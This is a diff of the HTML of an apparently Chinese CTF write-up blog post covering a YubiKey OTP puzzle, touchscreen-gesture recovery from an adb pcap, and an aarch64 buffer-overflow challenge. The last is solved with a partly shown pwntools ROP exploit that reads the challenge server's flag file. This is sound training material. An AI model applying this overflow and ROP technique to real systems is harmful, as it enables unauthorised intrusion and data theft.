style=color:#e6db74>&#39;0057&#39;</span>,<span style=color:#e6db74>&#39;0058&#39;</span>,<span style=color:#e6db74>&#39;0060&#39;</span>,<span style=color:#e6db74>&#39;0061&#39;</span>,<span style=color:#e6db74>&#39;0062&#39;</span>,<span style=color:#e6db74>&#39;0063&#39;</span>,<span style=color:#e6db74>&#39;0064&#39;</span>,<span style=color:#e6db74>&#39;0066&#39;</span>,<span style=color:#e6db74>&#39;0067&#39;</span>,<span style=color:#e6db74>&#39;0068&#39;</span>,<span style=color:#e6db74>&#39;0069&#39;</span>,<span style=color:#e6db74>&#39;006a&#39;</span>,<span style=color:#e6db74>&#39;006b&#39;</span>,<span style=color:#e6db74>&#39;006c&#39;</span>,<span style=color:#e6db74>&#39;006d&#39;</span>,<span style=color:#e6db74>&#39;006e&#39;</span>,<span style=color:#e6db74>&#39;006f&#39;</span>,<span style=color:#e6db74>&#39;0077&#39;</span>,<span style=color:#e6db74>&#39;007d&#39;</span>,<span style=color:#e6db74>&#39;007e&#39;</span>,<span style=color:#e6db74>&#39;007f&#39;</span>]
 
-ids_map <span style="color:#f92672">=</span> dict(zip(ids, ids_str))
+ids_map <span style=color:#f92672>=</span> dict(zip(ids, ids_str))
 
-input_ids <span style="color:#f92672">=</span> [<span style="color:#e6db74">&#39;002f&#39;</span>,<span style="color:#e6db74">&#39;002f&#39;</span>,<span style="color:#e6db74">&#39;0023&#39;</span>,<span style="color:#e6db74">&#39;0020&#39;</span>,<span style="color:#e6db74">&#39;0013&#39;</span>,<span style="color:#e6db74">&#39;0014&#39;</span>,<span style="color:#e6db74">&#39;0020&#39;</span>,<span style="color:#e6db74">&#39;0020&#39;</span>,<span style="color:#e6db74">&#39;0030&#39;</span>,<span style="color:#e6db74">&#39;0031&#39;</span>,<span style="color:#e6db74">&#39;002f&#39;</span>,<span style="color:#e6db74">&#39;002f&#39;</span>,<span style="color:#e6db74">&#39;0014&#39;</span>,<span style="color:#e6db74">&#39;0026&#39;</span>,<span style="color:#e6db74">&#39;0017&#39;</span>,<span style="color:#e6db74">&#39;0012&#39;</span>,<span style="color:#e6db74">&#39;0024&#39;</span>,<span style="color:#e6db74">&#39;0020&#39;</span>,<span style="color:#e6db74">&#39;0030&#39;</span>,<span style="color:#e6db74">&#39;0022&#39;</span>,<span style="color:#e6db74">&#39;0016&#39;</span>,<span style="color:#e6db74">&#39;0031&#39;</span>,<span style="color:#e6db74">&#39;0013&#39;</span>,<span style="color:#e6db74">&#39;0017&#39;</span>,<span style="color:#e6db74">&#39;002e&#39;</span>,<span style="color:#e6db74">&#39;0017&#39;</span>,<span style="color:#e6db74">&#39;0020&#39;</span>,<span style="color:#e6db74">&#39;0024&#39;</span>,<span style="color:#e6db74">&#39;0017&#39;</span>,<span style="color:#e6db74">&#39;0016&#39;</span>,<span style="color:#e6db74">&#39;002f&#39;</span>,<span style="color:#e6db74">&#39;0023&#39;</span>,<span style="color:#e6db74">&#39;0012&#39;</span>,<span style="color:#e6db74">&#39;0021&#39;</span>,<span style="color:#e6db74">&#39;0013&#39;</span>,<span style="color:#e6db74">&#39;0020&#39;</span>,<span style="color:#e6db74">&#39;0014&#39;</span>,<span style="color:#e6db74">&#39;0017&#39;</span>,<span style="color:#e6db74">&#39;0020&#39;</span>,<span style="color:#e6db74">&#39;0026&#39;</span>,<span style="color:#e6db74">&#39;0017&#39;</span>,<span style="color:#e6db74">&#39;0024&#39;</span>,<span style="color:#e6db74">&#39;0030&#39;</span>,<span style="color:#e6db74">&#39;0013&#39;</span>,<span style="color:#e6db74">&#39;001c&#39;</span>]
+input_ids <span style=color:#f92672>=</span> [<span style=color:#e6db74>&#39;002f&#39;</span>,<span style=color:#e6db74>&#39;002f&#39;</span>,<span style=color:#e6db74>&#39;0023&#39;</span>,<span style=color:#e6db74>&#39;0020&#39;</span>,<span style=color:#e6db74>&#39;0013&#39;</span>,<span style=color:#e6db74>&#39;0014&#39;</span>,<span style=color:#e6db74>&#39;0020&#39;</span>,<span style=color:#e6db74>&#39;0020&#39;</span>,<span style=color:#e6db74>&#39;0030&#39;</span>,<span style=color:#e6db74>&#39;0031&#39;</span>,<span style=color:#e6db74>&#39;002f&#39;</span>,<span style=color:#e6db74>&#39;002f&#39;</span>,<span style=color:#e6db74>&#39;0014&#39;</span>,<span style=color:#e6db74>&#39;0026&#39;</span>,<span style=color:#e6db74>&#39;0017&#39;</span>,<span style=color:#e6db74>&#39;0012&#39;</span>,<span style=color:#e6db74>&#39;0024&#39;</span>,<span style=color:#e6db74>&#39;0020&#39;</span>,<span style=color:#e6db74>&#39;0030&#39;</span>,<span style=color:#e6db74>&#39;0022&#39;</span>,<span style=color:#e6db74>&#39;0016&#39;</span>,<span style=color:#e6db74>&#39;0031&#39;</span>,<span style=color:#e6db74>&#39;0013&#39;</span>,<span style=color:#e6db74>&#39;0017&#39;</span>,<span style=color:#e6db74>&#39;002e&#39;</span>,<span style=color:#e6db74>&#39;0017&#39;</span>,<span style=color:#e6db74>&#39;0020&#39;</span>,<span style=color:#e6db74>&#39;0024&#39;</span>,<span style=color:#e6db74>&#39;0017&#39;</span>,<span style=color:#e6db74>&#39;0016&#39;</span>,<span style=color:#e6db74>&#39;002f&#39;</span>,<span style=color:#e6db74>&#39;0023&#39;</span>,<span style=color:#e6db74>&#39;0012&#39;</span>,<span style=color:#e6db74>&#39;0021&#39;</span>,<span style=color:#e6db74>&#39;0013&#39;</span>,<span style=color:#e6db74>&#39;0020&#39;</span>,<span style=color:#e6db74>&#39;0014&#39;</span>,<span style=color:#e6db74>&#39;0017&#39;</span>,<span style=color:#e6db74>&#39;0020&#39;</span>,<span style=color:#e6db74>&#39;0026&#39;</span>,<span style=color:#e6db74>&#39;0017&#39;</span>,<span style=color:#e6db74>&#39;0024&#39;</span>,<span style=color:#e6db74>&#39;0030&#39;</span>,<span style=color:#e6db74>&#39;0013&#39;</span>,<span style=color:#e6db74>&#39;001c&#39;</span>]
 
-result <span style="color:#f92672">=</span> [ids_map[x][<span style="color:#ae81ff">4</span>:]<span style="color:#f92672">.</span>lower() <span style="color:#66d9ef">for</span> x <span style="color:#f92672">in</span> input_ids]
+result <span style=color:#f92672>=</span> [ids_map[x][<span style=color:#ae81ff>4</span>:]<span style=color:#f92672>.</span>lower() <span style=color:#66d9ef>for</span> x <span style=color:#f92672>in</span> input_ids]
 
 print(result)
 
-<span style="color:#75715e"># output:</span>
-<span style="color:#75715e"># [&#39;v&#39;, &#39;v&#39;, &#39;h&#39;, &#39;d&#39;, &#39;r&#39;, &#39;t&#39;, &#39;d&#39;, &#39;d&#39;, &#39;b&#39;, &#39;n&#39;, &#39;v&#39;, &#39;v&#39;, &#39;t&#39;, &#39;l&#39;, &#39;i&#39;, &#39;e&#39;, &#39;j&#39;, &#39;d&#39;, &#39;b&#39;, &#39;g&#39;, &#39;u&#39;, &#39;n&#39;, &#39;r&#39;, &#39;i&#39;, &#39;c&#39;, &#39;i&#39;, &#39;d&#39;, &#39;j&#39;, &#39;i&#39;, &#39;u&#39;, &#39;v&#39;, &#39;h&#39;, &#39;e&#39;, &#39;f&#39;, &#39;r&#39;, &#39;d&#39;, &#39;t&#39;, &#39;i&#39;, &#39;d&#39;, &#39;l&#39;, &#39;i&#39;, &#39;j&#39;, &#39;b&#39;, &#39;r&#39;, &#39;enter&#39;]</span>
+<span style=color:#75715e># output:</span>
+<span style=color:#75715e># [&#39;v&#39;, &#39;v&#39;, &#39;h&#39;, &#39;d&#39;, &#39;r&#39;, &#39;t&#39;, &#39;d&#39;, &#39;d&#39;, &#39;b&#39;, &#39;n&#39;, &#39;v&#39;, &#39;v&#39;, &#39;t&#39;, &#39;l&#39;, &#39;i&#39;, &#39;e&#39;, &#39;j&#39;, &#39;d&#39;, &#39;b&#39;, &#39;g&#39;, &#39;u&#39;, &#39;n&#39;, &#39;r&#39;, &#39;i&#39;, &#39;c&#39;, &#39;i&#39;, &#39;d&#39;, &#39;j&#39;, &#39;i&#39;, &#39;u&#39;, &#39;v&#39;, &#39;h&#39;, &#39;e&#39;, &#39;f&#39;, &#39;r&#39;, &#39;d&#39;, &#39;t&#39;, &#39;i&#39;, &#39;d&#39;, &#39;l&#39;, &#39;i&#39;, &#39;j&#39;, &#39;b&#39;, &#39;r&#39;, &#39;enter&#39;]</span>
 
 </code></pre></div><p>这是yubikey的OTP一次性密码。</p>
 <p>分析一开始的欢迎语，其中有一条：</p>
-<pre tabindex="0"><code>echo Your flag will be tsctf{*data*}
+<pre tabindex=0><code>echo Your flag will be tsctf{*data*}
 </code></pre><p>最后只要把输入内容套上<code>tsctf{</code> <code>}</code>就可以交了</p>
-<h2 id="super_easy_adb">super_easy_adb</h2>
+<h2 id=super_easy_adb>super_easy_adb</h2>
 <p>这题我们拿到的依然是一个<code>.pcapng</code>格式的文件，老套路用wireshark可以直接打开，发现这次抓取的是USB协议的包，分析协议发现依然是adb shell。</p>
 <p>这次没有像TCP包那样的选项让我们可以导出包的内容，不过我们可以直接用vscode打开这个二进制文件，直接看其中的字符串：</p>
 <p>用<code>strings</code>命令可以提取出文件中的字符串内容：</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">strings -s <span style="color:#e6db74">&#39;&#39;</span> -w ./super_easy_adb.pcapng
-</code></pre></div><p><img src="/images/blog/66/image-20201019124706584.png" alt="image-20201019124706584"></p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh>strings -s <span style=color:#e6db74>&#39;&#39;</span> -w ./super_easy_adb.pcapng
+</code></pre></div><p><img src=/images/blog/66/image-20201019124706584.png alt=image-20201019124706584></p>
 <p>首先看<code>raw:</code>后面的内容，依然是<code>getevent -lp</code>、<code>getevent -p</code>、、<code>getevent -l</code>、<code>getevent -t</code>，但是这次的输入设备变成了<code>sec_touchscreen</code>，应该是一个触屏设备。</p>
 <p>老规矩把映射表捞出来：</p>
-<pre tabindex="0"><code>add device 2: /dev/input/event2
+<pre tabindex=0><code>add device 2: /dev/input/event2
   name:     &quot;sec_touchscreen&quot;
   events:    KEY (0001): KEY_HOMEPAGE         OKAYyWRTE BTN_TOOL_FINGER       BTN_TOUCH             01c7                     
              ABS (0003): ABS_X                 : value 0, min 0, max 1439, fuzz 0, flat 0, resolution 0
@@ -184,7 +158,7 @@ print(result)
                 ABS_MT_PRESSURE       : value 0, min 0, max 63, fuzz 0, flat 0, resolution 0
                 003e                  : value 126, min 0, max 65535, fuzz 0, flat 0, resolution 0
              SW  (0005): SW_PEN_INSERTED        input props:    INPUT_PROP_DIRECT
-</code></pre><pre tabindex="0"><code>add device 2: /dev/input/event2
+</code></pre><pre tabindex=0><code>add device 2: /dev/input/event2
   name:     &quot;sec_touchscreen&quot;
   events:
     KEY (0001): 00ac  0145  014a  01c7 
@@ -204,50 +178,50 @@ print(result)
     INPUT_PROP_DIRECT
 </code></pre><p>这次我们只看<code>ABS (0003):</code>里的<code>ABS_MT_POSITION_X</code>和<code>ABS_MT_POSITION_Y</code></p>
 <p>比如下面这两条输出：第二列为<code>ABS (0003):</code>，第三列分别为<code>ABS_MT_POSITION_X</code>和<code>ABS_MT_POSITION_Y</code>，第三列的值则是屏幕像素点坐标。</p>
-<pre tabindex="0"><code>[  270524.032103] 0003 0035 00000487
+<pre tabindex=0><code>[  270524.032103] 0003 0035 00000487
 [  270524.032103] 0003 0036 000007b9
 </code></pre><p>老规矩，写一个python脚本来解决这件事情</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">import</span> matplotlib.pyplot <span style="color:#66d9ef">as</span> plt
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=color:#f92672>import</span> matplotlib.pyplot <span style=color:#66d9ef>as</span> plt
 
-<span style="color:#75715e"># input_strs太长了， 这里只放一部分</span>
-input_strs <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;&#39;[  270488.473135] 0003 0039 0000e822
-</span><span style="color:#e6db74">[  270488.473135] 0001 014a 00000001
-</span><span style="color:#e6db74">[  270488.473135] 0001 0145 00000001
-</span><span style="color:#e6db74">[  270488.473135] 0003 0035 00000076
-</span><span style="color:#e6db74">[  270488.473135] 0003 0036 0000025b
-</span><span style="color:#e6db74">[  270488.473135] 0003 0030 0000000b
-</span><span style="color:#e6db74">[  270488.473135] 0003 0031 0000000b
-</span><span style="color:#e6db74">[  270488.473135] 0003 003a 00000007
-</span><span style="color:#e6db74">[  270488.473135] 0000 0000 00000000
-</span><span style="color:#e6db74">[  270488.497634] 0003 0030 0000000a
-</span><span style="color:#e6db74">[  270488.497634] 0003 0031 0000000a
-</span><span style="color:#e6db74">[  270488.497634] 0003 003a 00000006
-</span><span style="color:#e6db74">[  270488.497634] 0000 0000 00000000
-</span><span style="color:#e6db74">&#39;&#39;&#39;</span>
+<span style=color:#75715e># input_strs太长了， 这里只放一部分</span>
+input_strs <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;&#39;&#39;[  270488.473135] 0003 0039 0000e822
+</span><span style=color:#e6db74>[  270488.473135] 0001 014a 00000001
+</span><span style=color:#e6db74>[  270488.473135] 0001 0145 00000001
+</span><span style=color:#e6db74>[  270488.473135] 0003 0035 00000076
+</span><span style=color:#e6db74>[  270488.473135] 0003 0036 0000025b
+</span><span style=color:#e6db74>[  270488.473135] 0003 0030 0000000b
+</span><span style=color:#e6db74>[  270488.473135] 0003 0031 0000000b
+</span><span style=color:#e6db74>[  270488.473135] 0003 003a 00000007
+</span><span style=color:#e6db74>[  270488.473135] 0000 0000 00000000
+</span><span style=color:#e6db74>[  270488.497634] 0003 0030 0000000a
+</span><span style=color:#e6db74>[  270488.497634] 0003 0031 0000000a
+</span><span style=color:#e6db74>[  270488.497634] 0003 003a 00000006
+</span><span style=color:#e6db74>[  270488.497634] 0000 0000 00000000
+</span><span style=color:#e6db74>&#39;&#39;&#39;</span>
 
-cur_x <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
-cur_y <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
+cur_x <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>
+cur_y <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>
 
-xs <span style="color:#f92672">=</span> []
-ys <span style="color:#f92672">=</span> []
+xs <span style=color:#f92672>=</span> []
+ys <span style=color:#f92672>=</span> []
 
-<span style="color:#66d9ef">for</span> line <span style="color:#f92672">in</span> input_strs<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>):
-    <span style="color:#66d9ef">if</span> line[<span style="color:#ae81ff">18</span>:<span style="color:#ae81ff">22</span>] <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;0003&#39;</span>:
-        <span style="color:#66d9ef">if</span> line[<span style="color:#ae81ff">23</span>:<span style="color:#ae81ff">27</span>] <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;0035&#39;</span>:
-            cur_x <span style="color:#f92672">=</span> int(line[<span style="color:#ae81ff">28</span>:<span style="color:#ae81ff">36</span>], <span style="color:#ae81ff">16</span>)
-        <span style="color:#66d9ef">if</span> line[<span style="color:#ae81ff">23</span>:<span style="color:#ae81ff">27</span>] <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;0036&#39;</span>:
-            cur_y <span style="color:#f92672">=</span> <span style="color:#f92672">-</span>int(line[<span style="color:#ae81ff">28</span>:<span style="color:#ae81ff">36</span>], <span style="color:#ae81ff">16</span>) <span style="color:#75715e"># 翻转</span>
-            xs<span style="color:#f92672">.</span>append(cur_x)
-            ys<span style="color:#f92672">.</span>append(cur_y)
+<span style=color:#66d9ef>for</span> line <span style=color:#f92672>in</span> input_strs<span style=color:#f92672>.</span>split(<span style=color:#e6db74>&#39;</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#39;</span>):
+    <span style=color:#66d9ef>if</span> line[<span style=color:#ae81ff>18</span>:<span style=color:#ae81ff>22</span>] <span style=color:#f92672>==</span> <span style=color:#e6db74>&#39;0003&#39;</span>:
+        <span style=color:#66d9ef>if</span> line[<span style=color:#ae81ff>23</span>:<span style=color:#ae81ff>27</span>] <span style=color:#f92672>==</span> <span style=color:#e6db74>&#39;0035&#39;</span>:
+            cur_x <span style=color:#f92672>=</span> int(line[<span style=color:#ae81ff>28</span>:<span style=color:#ae81ff>36</span>], <span style=color:#ae81ff>16</span>)
+        <span style=color:#66d9ef>if</span> line[<span style=color:#ae81ff>23</span>:<span style=color:#ae81ff>27</span>] <span style=color:#f92672>==</span> <span style=color:#e6db74>&#39;0036&#39;</span>:
+            cur_y <span style=color:#f92672>=</span> <span style=color:#f92672>-</span>int(line[<span style=color:#ae81ff>28</span>:<span style=color:#ae81ff>36</span>], <span style=color:#ae81ff>16</span>) <span style=color:#75715e># 翻转</span>
+            xs<span style=color:#f92672>.</span>append(cur_x)
+            ys<span style=color:#f92672>.</span>append(cur_y)
 
-plt<span style="color:#f92672">.</span>scatter(xs, ys, alpha<span style="color:#f92672">=</span><span style="color:#ae81ff">0.6</span>)
-plt<span style="color:#f92672">.</span>show()
+plt<span style=color:#f92672>.</span>scatter(xs, ys, alpha<span style=color:#f92672>=</span><span style=color:#ae81ff>0.6</span>)
+plt<span style=color:#f92672>.</span>show()
 </code></pre></div><p>需要注意的是，与数学中的二位坐标不同，Android屏幕的坐标原点在屏幕左上角，因此y轴的方向是向下的，我们用一个负号来翻转图像。</p>
-<p><img src="/images/blog/66/image-20201019130558172.png" alt="image-20201019130558172"></p>
+<p><img src=/images/blog/66/image-20201019130558172.png alt=image-20201019130558172></p>
 <p>屏幕手势的内容就是flag啦</p>
-<h2 id="helloarm">HelloARM</h2>
+<h2 id=helloarm>HelloARM</h2>
 <p>这题是一道arm的pwn题，思路是ROP，给的程序包含三个文件：</p>
-<pre tabindex="0"><code>Archive:  HelloARM-d16411d0de1ce65a122d8f567ff53897.zip
+<pre tabindex=0><code>Archive:  HelloARM-d16411d0de1ce65a122d8f567ff53897.zip
   Length      Date    Time    Name
 ---------  ---------- -----   ----
         0  2020-10-05 17:31   lib/
@@ -257,117 +231,117 @@ plt<span style="color:#f92672">.</span>show()
 ---------                     -------
   1480832                     4 files
 </code></pre><p>首先checksec看一下：</p>
-<p><img src="/images/blog/66/image-20201019142904415.png" alt="image-20201019142904415"></p>
+<p><img src=/images/blog/66/image-20201019142904415.png alt=image-20201019142904415></p>
 <p>是aarch64小端的程序，可以发现开启了NX，意味着我们不能在栈上执行代码，没开PIE意味着地址不是随机的。</p>
 <p>先用qemu跑一下程序：</p>
-<pre tabindex="0"><code>qemu-aarch64 -L ./ ./HelloARM
-</code></pre><p><img src="/images/blog/66/image-20201019132755929.png" alt="image-20201019132755929"></p>
+<pre tabindex=0><code>qemu-aarch64 -L ./ ./HelloARM
+</code></pre><p><img src=/images/blog/66/image-20201019132755929.png alt=image-20201019132755929></p>
 <p>总的来说程序先给出一个Magic number，然后会有两轮输入输出的交互。</p>
 <p>接下来用ida分析，main函数先去执行init函数，其中会打开当前目录下的一个<code>./flag</code>文件，并把文件描述符存到全局变量<code>fd</code>里面，main函数内部在栈上开辟了一个缓冲区，Magic number就是这个缓冲区的栈地址，随后会读入大小为0x10的内容到bss段的<code>name</code>数组中，随后打印这串内容，最后进入<code>oooooo()</code>函数，函数内部开辟了0x100大小的栈上数组用来存用户输入的message，但这里存在溢出漏洞。</p>
 <p>首先我们需要知道的是，aarch64用X30这个寄存器来存储函数调用的返回地址，并在进入子函数后将X30中的返回地址压入栈中。比较特别的是<code>oooooo()</code>函数中，栈上数组的地址比存放X30内容的地址高，因此无法劫持<code>oooooo()</code>的<code>ret</code>指令，但是我们还可以劫持<code>main()</code>的<code>ret</code>指令。</p>
 <p>找到切入点后，我们尝试寻找可用的<code>gadget</code>，寻找一番没有找到合适的。但是该程序中包含一个<code>__libc_csu_init()</code>函数，利用该函数中的特殊结构，我们可以指定参数并完成任意函数的调用。</p>
-<p><img src="/images/blog/66/image-20201019134343835.png" alt="image-20201019134343835"></p>
+<p><img src=/images/blog/66/image-20201019134343835.png alt=image-20201019134343835></p>
 <p>最后这题的思路主要是：</p>
 <ul>
 <li>用<code>oooooo()</code>的缓冲区溢出劫持<code>main()</code>的<code>ret</code>指令，让它跳转到<code>__libc_csu_init()</code>函数内部<code>.text:0000000000400AD0</code>地址处（上图）。</li>
 <li>然后我们通过精心构造溢出部分的内容，让程序去调用.plt表中的<code>read()</code>函数，读出<code>./flag</code>文件的内容（这里我们猜测服务器上fd的值是3，本地测试qemu上运行时fd是5），放到<code>main()</code>函数栈上的缓冲区中（即magic number给出的地址）。</li>
 <li>然后再一次利用<code>__libc_csu_init()</code>函数，调用一个<code>write()</code>函数，将magic number处的内容写到标准输入里。</li>
 </ul>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
-<span style="color:#f92672">import</span> sys
-context<span style="color:#f92672">.</span>log_level<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;debug&#39;</span>
-context<span style="color:#f92672">.</span>arch<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;aarch64&#39;</span>
-Debug <span style="color:#f92672">=</span> <span style="color:#66d9ef">True</span>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=color:#f92672>from</span> pwn <span style=color:#f92672>import</span> <span style=color:#f92672>*</span>
+<span style=color:#f92672>import</span> sys
+context<span style=color:#f92672>.</span>log_level<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;debug&#39;</span>
+context<span style=color:#f92672>.</span>arch<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;aarch64&#39;</span>
+Debug <span style=color:#f92672>=</span> <span style=color:#66d9ef>True</span>
 
-elf<span style="color:#f92672">=</span>ELF(<span style="color:#e6db74">&#39;./HelloARM&#39;</span>, checksec <span style="color:#f92672">=</span> <span style="color:#66d9ef">False</span>)
+elf<span style=color:#f92672>=</span>ELF(<span style=color:#e6db74>&#39;./HelloARM&#39;</span>, checksec <span style=color:#f92672>=</span> <span style=color:#66d9ef>False</span>)
 
-libc<span style="color:#f92672">=</span>ELF(<span style="color:#e6db74">&#34;./lib/libc.so.6&#34;</span>, checksec <span style="color:#f92672">=</span> <span style="color:#66d9ef">False</span>)
+libc<span style=color:#f92672>=</span>ELF(<span style=color:#e6db74>&#34;./lib/libc.so.6&#34;</span>, checksec <span style=color:#f92672>=</span> <span style=color:#66d9ef>False</span>)
 
-<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">get_sh</span>(other_libc <span style="color:#f92672">=</span> null):
-    <span style="color:#66d9ef">return</span> remote(<span style="color:#e6db74">&#39;10.104.255.210&#39;</span>, <span style="color:#ae81ff">7777</span>)
-    <span style="color:#75715e"># global libc</span>
-    <span style="color:#75715e"># if args[&#39;REMOTE&#39;]:</span>
-    <span style="color:#75715e">#     if other_libc is not null:</span>
-    <span style="color:#75715e">#         libc = ELF(&#34;./&#34;, checksec = False)</span>
-    <span style="color:#75715e">#     return remote(&#39;10.104.255.210&#39;, 7777)</span>
-    <span style="color:#75715e"># elif Debug:</span>
-    <span style="color:#75715e">#     sh = process([&#34;qemu-aarch64&#34;, &#34;-g&#34;, &#34;2333&#34;, &#34;-L&#34;, &#34;./&#34;, &#34;./HelloARM&#34;])</span>
-    <span style="color:#75715e">#     log.info(&#39;Please use GDB remote!(Enter to continue)&#39;)</span>
-    <span style="color:#75715e">#     raw_input()</span>
-    <span style="color:#75715e">#     return sh</span>
-    <span style="color:#75715e"># else :</span>
-    <span style="color:#75715e">#     return process([&#34;qemu-aarch64&#34;, &#34;-L&#34;, &#34;./&#34;, &#34;./HelloARM&#34;])</span>
-
-
-conn <span style="color:#f92672">=</span> get_sh()
-conn<span style="color:#f92672">.</span>recvline()
-bb <span style="color:#f92672">=</span> conn<span style="color:#f92672">.</span>recvline()
-hex_magic <span style="color:#f92672">=</span> bb[<span style="color:#ae81ff">15</span>:<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>]<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#39;utf-8&#39;</span>)
-addr_magic <span style="color:#f92672">=</span> int(hex_magic, <span style="color:#ae81ff">16</span>)
-
-guess_fd <span style="color:#f92672">=</span> <span style="color:#ae81ff">3</span>
-flag_len <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x20</span><span style="color:#f92672">*</span><span style="color:#ae81ff">8</span> <span style="color:#f92672">-</span> <span style="color:#ae81ff">8</span>
-
-conn<span style="color:#f92672">.</span>recv()
-conn<span style="color:#f92672">.</span>send(<span style="color:#e6db74">&#39;imlk____________&#39;</span>)
-conn<span style="color:#f92672">.</span>recv()
-payload <span style="color:#f92672">=</span> (<span style="color:#e6db74">&#39;a&#39;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">0x100</span>)<span style="color:#f92672">.</span>encode() <span style="color:#75715e"># 填充</span>
-
-payload <span style="color:#f92672">+=</span> p64(addr_magic <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x10</span>) <span style="color:#75715e"># x29</span>
-payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0x0000000000400AD0</span>) <span style="color:#75715e"># x30 for ret to __libc</span>
-<span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0x32</span>):
-    <span style="color:#66d9ef">if</span> i <span style="color:#f92672">==</span> <span style="color:#ae81ff">0x0</span>: 
-        payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0x0000000000400730</span>) <span style="color:#75715e"># set to write func pointer</span>
-    <span style="color:#66d9ef">elif</span> i <span style="color:#f92672">==</span> <span style="color:#ae81ff">0x1</span>: <span style="color:#75715e"># addr_magic-0x08 for w</span>
-        payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0x0000000000400760</span>) <span style="color:#75715e"># set to read func pointer</span>
-    <span style="color:#66d9ef">elif</span> i <span style="color:#f92672">==</span> <span style="color:#ae81ff">0x2</span>: <span style="color:#75715e"># addr_magic</span>
-        payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0</span>) <span style="color:#75715e"># addr_magic-0x28 for x19</span>
+<span style=color:#66d9ef>def</span> <span style=color:#a6e22e>get_sh</span>(other_libc <span style=color:#f92672>=</span> null):
+    <span style=color:#66d9ef>return</span> remote(<span style=color:#e6db74>&#39;10.104.255.210&#39;</span>, <span style=color:#ae81ff>7777</span>)
+    <span style=color:#75715e># global libc</span>
+    <span style=color:#75715e># if args[&#39;REMOTE&#39;]:</span>
+    <span style=color:#75715e>#     if other_libc is not null:</span>
+    <span style=color:#75715e>#         libc = ELF(&#34;./&#34;, checksec = False)</span>
+    <span style=color:#75715e>#     return remote(&#39;10.104.255.210&#39;, 7777)</span>
+    <span style=color:#75715e># elif Debug:</span>
+    <span style=color:#75715e>#     sh = process([&#34;qemu-aarch64&#34;, &#34;-g&#34;, &#34;2333&#34;, &#34;-L&#34;, &#34;./&#34;, &#34;./HelloARM&#34;])</span>
+    <span style=color:#75715e>#     log.info(&#39;Please use GDB remote!(Enter to continue)&#39;)</span>
+    <span style=color:#75715e>#     raw_input()</span>
+    <span style=color:#75715e>#     return sh</span>
+    <span style=color:#75715e># else :</span>
+    <span style=color:#75715e>#     return process([&#34;qemu-aarch64&#34;, &#34;-L&#34;, &#34;./&#34;, &#34;./HelloARM&#34;])</span>
 
 
-    <span style="color:#66d9ef">elif</span> i <span style="color:#f92672">==</span> <span style="color:#ae81ff">0x22</span>:<span style="color:#75715e"># x29</span>
-        payload <span style="color:#f92672">+=</span> p64(addr_magic <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x10</span>)
-    <span style="color:#66d9ef">elif</span> i <span style="color:#f92672">==</span> <span style="color:#ae81ff">0x23</span>:<span style="color:#75715e"># x30</span>
-        payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0x0000000000400AB0</span>) <span style="color:#75715e"># for ret to __libc stage 2</span>
-    <span style="color:#66d9ef">elif</span> i <span style="color:#f92672">==</span> <span style="color:#ae81ff">0x25</span>: <span style="color:#75715e"># x20</span>
-        payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">1</span>) <span style="color:#75715e"># to compare with x19, mark read() finished</span>
-    <span style="color:#66d9ef">elif</span> i <span style="color:#f92672">==</span> <span style="color:#ae81ff">0x26</span>: <span style="color:#75715e"># x21</span>
-        payload <span style="color:#f92672">+=</span> p64(addr_magic <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x8</span>)
-    <span style="color:#66d9ef">elif</span> i <span style="color:#f92672">==</span> <span style="color:#ae81ff">0x27</span>: <span style="color:#75715e"># x22</span>
-        payload <span style="color:#f92672">+=</span> p64(guess_fd)
-    <span style="color:#66d9ef">elif</span> i <span style="color:#f92672">==</span> <span style="color:#ae81ff">0x28</span>: <span style="color:#75715e"># x23</span>
-        payload <span style="color:#f92672">+=</span> p64(addr_magic <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x8</span>)
